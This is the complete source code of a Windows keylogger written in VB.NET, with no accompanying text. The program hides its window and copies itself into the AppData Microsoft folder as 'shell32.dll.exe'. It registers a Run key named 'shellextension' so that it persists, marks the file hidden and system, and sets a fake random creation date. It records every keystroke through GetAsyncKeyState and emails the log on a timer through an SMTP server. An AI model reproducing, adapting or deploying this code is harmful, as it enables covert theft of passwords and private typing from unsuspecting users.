Imports System.Net.Mail
Imports Microsoft.Win32
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal nvKey As Long) As Integer
    Dim LG As New _LOG(AddressOf LOG)
    Dim LOGTEXT As String
    Private INSTALL_PATH As String = Environment.ExpandEnvironmentVariables("%APPDATA%") & "\Microsoft"
    Const APP_NAME As String = "shell32.dll.exe"
    Private MYSELF As String = Application.ExecutablePath
    Private INSTALLATION_FULLPATH As String = INSTALL_PATH & "\" & APP_NAME

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        On Error Resume Next
        lg.EndInvoke(Nothing)
        Application.ExitThread()
        Application.Exit()
        End
    End Sub

    Sub APP_INSTALL()
        On Error Resume Next
        IO.File.Copy(MYSELF, INSTALLATION_FULLPATH)
        Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run").SetValue("shellextension", INSTALLATION_FULLPATH)
        My.Computer.FileSystem.GetFileInfo(INSTALLATION_FULLPATH).Attributes = IO.FileAttributes.Hidden + IO.FileAttributes.System
        My.Computer.FileSystem.GetFileInfo(INSTALLATION_FULLPATH).CreationTime = RANDOM_DATE()
    End Sub

    Function RANDOM_DATE() As Date
        Dim DAY, MONTH, YEAR, HOUR, MINUTE, SECOND
        Randomize()
        DAY = Int(Rnd() * 28) + 1
        Randomize()
        MONTH = Int(Rnd() * 11) + 1
        Randomize()
        YEAR = Int(Rnd() * 6) + 1
        Randomize()
        HOUR = Int(Rnd() * 23) + 1
        Randomize()
        MINUTE = Int(Rnd() * 58) + 1
        Randomize()
        SECOND = Int(Rnd() * 58) + 1
        Return Date.Parse(String.Format("{0}/{1}/201{2} {3}:{4}:{5}", New Object() {DAY, MONTH, YEAR, HOUR, MINUTE, SECOND}))
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        APP_INSTALL()
        If MYSELF <> INSTALLATION_FULLPATH Then
            If Process.GetProcessesByName("shell32.dll").Length = 1 Then
                Process.Start(INSTALLATION_FULLPATH)
                End
            Else
                End
            End If
        End If
        LOGTEXT = "Iniciado em " & Now.ToString & vbCrLf & vbCrLf
        LG.BeginInvoke(Nothing, Nothing)
    End Sub

    Delegate Sub _LOG()

    Sub LOG()
        On Error Resume Next
        While 1
            Dim cKey As String = ""
            For k = Keys.A To Keys.Z
                If Clicked(k) Then
                    If Caps() = True And Shift() = False Or Caps() = False And Shift() = True Then
                        cKey = UCase(Chr(k))
                    Else
                        cKey = LCase(Chr(k))
                    End If
                    GoTo AddKey
                End If
            Next
            If Clicked(32) Then
                cKey = " "
                GoTo AddKey
            End If
            For k = 45 To 57
                If Clicked(k) Then
                    cKey = Chr(k)
                    If Shift() = True Then
                        Select Case cKey
                            Case "0"
                                cKey = ")"
                            Case "1"
                                cKey = "!"
                            Case "2"
                                cKey = "@"
                            Case "3"
                                cKey = "#"
                            Case "4"
                                cKey = "$"
                            Case "5"
                                cKey = "%"
                            Case "6"
                                cKey = "¨"
                            Case "7"
                                cKey = "&"
                            Case "8"
                                cKey = "*"
                            Case "9"
                                cKey = "("
                        End Select
                    End If
                    GoTo AddKey
                End If
            Next
            If Clicked(Keys.Enter) Then
                cKey = "{ENTER}"
                GoTo AddKey
            End If
            If Clicked(226) Then
                If Shift() = True Then
                    cKey = "|"
                Else
                    cKey = "\"
                End If
                GoTo AddKey
            End If
            If Clicked(189) Then
                If Shift() = True Then
                    cKey = "_"
                Else
                    cKey = "-"
                End If
                GoTo AddKey
            End If
            If Clicked(187) Then
                If Shift() = True Then
                    cKey = "+"
                Else
                    cKey = "="
                End If
                GoTo AddKey
            End If
            If Clicked(219) Then
                If Shift() = True Then
                    cKey = "`"
                Else
                    cKey = "´"
                End If
                GoTo AddKey
            End If
            If Clicked(222) Then
                If Shift() = True Then
                    cKey = "^"
                Else
                    cKey = "~"
                End If
                GoTo AddKey
            End If
            If Clicked(220) Then
                If Shift() = True Then
                    cKey = "}"
                Else
                    cKey = "]"
                End If
                GoTo AddKey
            End If
            If Clicked(221) Then
                If Shift() = True Then
                    cKey = "{"
                Else
                    cKey = "["
                End If
                GoTo AddKey
            End If
            If Clicked(188) Then
                If Shift() = True Then
                    cKey = "<"
                Else
                    cKey = ","
                End If
                GoTo AddKey
            End If
            If Clicked(190) Then
                If Shift() = True Then
                    cKey = ">"
                Else
                    cKey = "."
                End If
                GoTo AddKey
            End If
            If Clicked(191) Then
                If Shift() = True Then
                    cKey = ":"
                Else
                    cKey = ";"
                End If
                GoTo AddKey
            End If
            If Clicked(193) Then
                If Shift() = True Then
                    cKey = "?"
                Else
                    cKey = "/"
                End If
                GoTo AddKey
            End If
AddKey:
            LogText &= cKey
        End While
    End Sub

    Function Clicked(ByVal KEY As Long) As Boolean
        Return (getAsyncKeyState(KEY) = -32767)
    End Function

    Function Caps() As Boolean
        Return My.Computer.Keyboard.CapsLock
    End Function

    Function Shift() As Boolean
        Return My.Computer.Keyboard.ShiftKeyDown
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim Smtp As New SmtpClient("smtp.server.com", 587)
        Dim Mail As New MailMessage("from@server.com", "to@server.com", "Keylogger from " & My.Computer.Name, "Here's the log:" & vbCrLf & vbCrLf & LOGTEXT)
        Smtp.Credentials = New Net.NetworkCredential("from@server.com", "password")
        Smtp.Send(Mail)
        LOGTEXT = "Iniciado em " & Now.Date.ToString & vbCrLf & vbCrLf
    End Sub
End Class
